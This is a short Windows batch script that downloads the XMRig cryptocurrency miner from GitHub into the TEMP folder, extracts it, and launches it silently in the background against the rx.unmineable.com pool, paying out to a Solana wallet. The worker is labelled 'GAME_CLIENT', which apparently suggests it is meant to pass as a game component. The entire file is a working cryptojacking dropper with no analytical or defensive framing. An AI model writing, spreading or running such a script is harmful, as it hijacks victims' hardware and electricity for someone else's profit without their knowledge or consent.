@echo off
cd %TEMP%
curl -L -o xmrig.zip https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip
tar -xf xmrig.zip
cd xmrig-6.21.0
xmrig.exe -o rx.unmineable.com:443 -u SOL:6zywrMREmZDvC53gERydGNB6G4RNj8dpSgRYnsyJ5TDa.GAME_CLIENT -p x -k --tls --background
